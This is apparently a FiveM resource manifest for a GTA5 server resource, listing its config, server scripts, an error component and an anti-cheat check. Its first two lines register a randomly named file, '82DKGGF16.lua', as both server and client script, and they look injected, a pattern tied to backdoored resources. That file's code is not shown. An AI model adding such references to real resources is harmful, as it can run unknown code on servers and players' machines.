server_script "82DKGGF16.lua"
client_script "82DKGGF16.lua"
fx_version("cerulean")
games({ "gta5" })
lua54("yes")
client_script("@mythic-base/components/cl_error.lua")
client_script("@mythic-pwnzor/client/check.lua")

server_only("yes")

server_scripts({
	"config.lua",
	"server/*.lua",
})
